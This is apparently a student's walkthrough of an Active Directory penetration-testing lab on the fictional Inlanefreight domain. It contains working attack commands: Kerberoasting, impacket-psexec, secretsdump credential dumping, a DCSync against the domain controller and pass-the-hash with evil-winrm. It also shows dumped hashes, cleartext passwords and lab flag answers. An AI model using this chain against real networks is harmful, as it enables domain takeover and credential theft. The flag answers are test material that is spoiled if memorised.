# AD Enumeration & Attacks - Skills Assessment Part I

### Scenario

A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: `admin:My_W3bsH3ll_P@ssw0rd!`) in place for us to start from in the `/uploads` directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.

Apply what you learned in this module to compromise the domain and answer the questions below to complete part I of the skills assessment.

### Questions

**Submit the contents of the flag.txt file on the administrator Desktop of the web server**

<figure><img src="../../../.gitbook/assets/image (49).png" alt=""><figcaption><p>got a revshell and obtained the flag.</p></figcaption></figure>

**Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer**

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption><p>svc_sql</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

**Crack the account's password. Submit the cleartext value.**

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption><p>lucky7</p></figcaption></figure>

**Submit the contents of the flag.txt file on the Administrator desktop on MS01**

we have to know what IP does MS01 has&#x20;

```
Resolve-IPAddress -ComputerName MS01
```

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption><p>172.16.6.50</p></figcaption></figure>

When SMB scan was performed, there were ADMIN$ and C$ shares, which were read and writable.

<figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption><p>Admin share writable</p></figcaption></figure>

Next logical step is to run impacket-psexec to gain a shell using this credential.

```
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> systeminfo
 
Host Name:                 MS01
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00429-00521-62775-AA100
Original Install Date:     3/30/2022, 3:56:23 AM
System Boot Time:          7/5/2023, 10:04:57 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-06:00) Central Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 3,198 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 4,000 MB
Virtual Memory: In Use:    799 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    INLANEFREIGHT.LOCAL
Logon Server:              N/A
Hotfix(s):                 5 Hotfix(s) Installed.
                           [01]: KB5009472
                           [02]: KB4535680
                           [03]: KB4589208
                           [04]: KB5010427
                           [05]: KB5009642
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.16.6.50
                                 [02]: fe80::fc35:9ed3:e474:d620
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

C:\Windows\system32> 

```

<figure><img src="../../../.gitbook/assets/image (2) (3).png" alt=""><figcaption><p>spn$<em>r0ast1ng_on</em>@n_0p3n_f1re</p></figcaption></figure>

Note that RDP is also available for this host.

**Find cleartext credentials for another domain user. Submit the username as your answer.**

<figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption><p>nothing useful</p></figcaption></figure>

```
proxychains impacket-secretsdump INLANEFREIGHT.LOCAL/svc_sql:lucky7@172.16.6.50 -outputfile inlanefreight_hashes 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.6.50:445  ...  OK
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x9521a9e7c65245ab8cdd792e7f6d20df
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801
INLANEFREIGHT.LOCAL/svc_sql:$DCC2$10240#svc_sql#acc5441d637ce6aabf3a3d9d4f8137fb
INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#9553faad97c2767127df83980f3ac245
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
INLANEFREIGHT\MS01$:aes256-cts-hmac-sha1-96:7ec92cbf5c0978d63da9ca099e9e15131fa9f8f83f6e0c850dc27fbf5bd3c294
INLANEFREIGHT\MS01$:aes128-cts-hmac-sha1-96:34eddfc4c6391fe4fcea4cd8e6f000aa
INLANEFREIGHT\MS01$:des-cbc-md5:1a2c5df13885f80b
INLANEFREIGHT\MS01$:plain_password_hex:19e615bcf39b1aa4ee984e52f1d993a21c6943bd6d90ca901ff0a676620f637ee41049607477f7560972a707da615942143dd3ec94e50b4a73d1539f51e312b591594d5b365a52d56cfc4cc2bbe4cd5014165fd6e9ba47530321d9361e63a6de7400435ab03b6c15e45f222bb511637855b14f7807cd3b29622540ffadf25300326fea2d197d42dd0e70eb082147e355596f39ee809ce68092d89e56f6427824d436b3a932da26f4bfcf7cf0ec8024e222af81521df95eeca49d8a9260baafc27725e940c28299dfa54a6e997aa673d77f00d0bdf7a389aaf4cf0037f6c9d8165b6b185ec135b59eda45b74170a91ec6
INLANEFREIGHT\MS01$:aad3b435b51404eeaad3b435b51404ee:e97a877bf59d4102321bded442896bee:::
[*] DefaultPassword 
INLANEFREIGHT\tpetty:Sup3rS3cur3D0m@inU2eR
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x8dbe842a7352000be08ef80e32bb35609e7d1786
dpapi_userkey:0xb20d199f3d953f7977a6363a69a9fe21d97ecd19
[*] NL$KM 
 0000   A2 52 9D 31 0B B7 1C 75  45 D6 4B 76 41 2D D3 21   .R.1...uE.KvA-.!
 0010   C6 5C DD 04 24 D3 07 FF  CA 5C F4 E5 A0 38 94 14   .\..$....\...8..
 0020   91 64 FA C7 91 D2 0E 02  7A D6 52 53 B4 F4 A9 6F   .d......z.RS...o
 0030   58 CA 76 00 DD 39 01 7D  C5 F7 8F 4B AB 1E DC 63   X.v..9.}...K...c
NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
[*] Cleaning up... 
[*] Stopping service RemoteRegistry

```

```
tpetty:Sup3rS3cur3D0m@inU2eR
```

**Submit this user's cleartext password.**

```
Sup3rS3cur3D0m@inU2eR
```

**What attack can this user perform?**

```
$sid = Convert-NameToSid tpetty
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```

<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption><p>DS-Replication-Get-Changes-All</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption><p>DS-Replication-Get-Changes-In-Filtered-Set</p></figcaption></figure>



DCSync

**Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01**

First we have to know what IP is the DC by using the following command.

<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption><p>172.16.6.3</p></figcaption></figure>

```
proxychains impacket-secretsdump -just-dc INLANEFREIGHT/tpetty:'Sup3rS3cur3D0m@inU2eR'@172.16.6.3 -outputfile ilf_dcsync
```

<figure><img src="../../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

We got the administrator hash, I tried to crack it but doesn't seems to work the next step will be pass the hash attack because of the dcsync command seems to be going on forever with more than thousand people already.

`27dedb1dab4d8545c6e1c66fba077da0`

xfreerdp didn't work but evil-winrm did

```
proxychains evil-winrm -i 172.16.6.3 -u Administrator -H 27dedb1dab4d8545c6e1c66fba077da0
```

<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption><p>r3plicat1on_m@st3r!</p></figcaption></figure>
